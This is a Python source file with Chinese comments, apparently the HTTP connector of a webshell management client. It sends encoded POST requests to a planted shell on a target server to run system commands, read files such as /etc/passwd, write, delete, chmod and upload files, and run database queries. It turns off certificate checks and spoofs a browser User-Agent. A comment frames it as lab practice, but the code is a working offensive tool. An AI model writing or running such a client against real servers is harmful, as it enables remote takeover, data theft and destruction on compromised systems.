"""
连接器 - HTTP 通信层

负责向 Webshell 发送命令和接收响应
"""
import urllib.request
import urllib.error
import urllib.parse
import ssl
import time
from .encoder import Encoder


class Connector:
    """管理与单个 Webshell 的 HTTP 连接"""

    def __init__(self, url: str, password: str, timeout: int = 30):
        """
        url: Webshell URL (e.g. http://target.com/shell.php)
        password: Webshell 密码
        timeout: 请求超时秒数
        """
        self.url = url
        self.timeout = timeout
        self.encoder = Encoder(password)
        # 忽略 SSL 证书验证（内网靶机练习使用）
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def send(self, cmd: dict) -> dict:
        """
        发送命令并返回解码后的响应

        cmd 示例:
          {"action": "list", "path": "/var/www"}
          {"action": "exec", "command": "whoami"}
          {"action": "read", "path": "/etc/passwd"}
        """
        try:
            # 编码命令
            encoded = self.encoder.encode(cmd)
            post_data = f"data={urllib.parse.quote(encoded)}".encode()

            # 发送 POST 请求
            req = urllib.request.Request(
                self.url,
                data=post_data,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                method='POST',
            )

            start = time.time()
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ssl_context) as resp:
                raw = resp.read().decode()

            elapsed = time.time() - start

            # 解码响应
            result = self.encoder.decode(raw)
            result['_elapsed'] = round(elapsed, 3)
            return result

        except urllib.error.HTTPError as e:
            return {'error': f'HTTP {e.code}: {e.reason}', '_elapsed': 0}
        except urllib.error.URLError as e:
            return {'error': f'连接失败: {e.reason}', '_elapsed': 0}
        except Exception as e:
            return {'error': f'请求异常: {str(e)}', '_elapsed': 0}

    def ping(self) -> dict:
        """测试连接是否存活"""
        return self.send({'action': 'ping'})

    def exec_cmd(self, command: str) -> dict:
        """执行系统命令"""
        return self.send({'action': 'exec', 'command': command})

    def list_dir(self, path: str = '.') -> dict:
        """列出目录内容"""
        return self.send({'action': 'list', 'path': path})

    def read_file(self, path: str) -> dict:
        """读取文件内容"""
        return self.send({'action': 'read', 'path': path})

    def write_file(self, path: str, content: str) -> dict:
        """写入文件"""
        return self.send({'action': 'write', 'path': path, 'content': content})

    def delete(self, path: str) -> dict:
        """删除文件或目录"""
        return self.send({'action': 'delete', 'path': path})

    def rename(self, path: str, newname: str) -> dict:
        """重命名文件或目录"""
        return self.send({'action': 'rename', 'path': path, 'newname': newname})

    def chmod(self, path: str, mode: str) -> dict:
        """修改文件权限"""
        return self.send({'action': 'chmod', 'path': path, 'mode': mode})

    def upload(self, remote_path: str, local_file: str) -> dict:
        """上传文件"""
        import base64
        with open(local_file, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        return self.send({'action': 'upload', 'path': remote_path, 'data': data})

    def get_info(self) -> dict:
        """获取系统信息"""
        return self.send({'action': 'info'})

    def db_query(self, host: str, port: str, user: str, password: str,
                 dbname: str, sql: str) -> dict:
        """执行数据库查询"""
        return self.send({
            'action': 'db_query',
            'host': host,
            'port': port,
            'user': user,
            'pass': password,
            'dbname': dbname,
            'sql': sql,
        })
